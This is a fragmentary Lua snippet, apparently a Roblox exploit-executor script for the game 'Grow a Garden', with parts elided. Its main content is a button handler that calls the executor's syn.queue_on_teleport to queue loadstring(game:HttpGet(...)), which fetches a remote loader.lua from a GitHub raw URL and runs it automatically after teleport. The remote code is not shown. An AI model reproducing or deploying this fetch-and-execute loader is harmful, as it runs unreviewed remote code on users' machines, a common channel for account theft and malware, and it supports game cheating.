...
local teleportScript = [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/loader.lua"))()
]]
...
local success, err = xpcall(function()
    ...
    local function createMainTabContent()
        ...
        activateButton.MouseButton1Click:Connect(function()
            ...
            elseif syn and syn.queue_on_teleport then
                syn.queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/loader.lua"))()]])
            end
